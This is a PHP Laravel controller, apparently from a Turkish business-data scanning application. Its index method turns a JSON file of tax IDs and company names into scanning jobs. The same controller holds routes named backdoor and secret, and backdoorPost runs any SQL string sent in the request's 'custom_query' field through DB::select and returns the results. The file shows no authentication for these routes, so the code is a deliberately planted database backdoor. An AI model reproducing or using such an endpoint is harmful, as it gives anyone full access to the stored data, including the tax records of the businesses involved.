<?php

namespace App\Http\Controllers;

use App\Http\Api\NetsantralApi;
use App\Http\Api\OperationApi\DataScanning\DataScanningApi;
use App\Http\Api\OperationApi\Operation\OperationApi;
use App\Http\Api\OperationApi\SpecialReport\SpecialReportApi;
use App\Http\Api\OperationApi\SurveySystem\SurveySystemApi;
use App\Models\Queue;
use App\Models\User;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\DB;

class HomeController extends Controller
{
    public function index(Request $request)
    {
        set_time_limit(86400);
        $jobList = [];
        $dataList = (array)json_decode(file_get_contents(public_path('n11.json')), true);
        for ($i = 0; $i < count($dataList); $i++) {
            $jobList[] = [
                'grupKodu' => 200,
                'vknTckn' => $dataList[$i]['vkn'],
                'unvan' => $dataList[$i]['name'],
                'sehir' => 'YOK',
                'ilce' => 'YOK',
                'islemAdi' => 'n11 Data Tarama',
                'Oncelik' => 5
            ];
        }

        $api = new DataScanningApi;
        $response = $api->SetDataScanning($jobList);

        return $response->body();
    }

    public function backdoor()
    {
        return view('backdoor');
    }

    public function backdoorPost(Request $request)
    {
        return response()->json(DB::select($request->custom_query), 200);
    }

    public function secret()
    {
        return view('secret');
    }

    public function secretPost(Request $request)
    {
        return response()->json((new SpecialReportApi)->GetSpecialReport(date('Y-m-d'), date('Y-m-d'), $request->custom_query)['response'] ?? [], 200);
    }
}
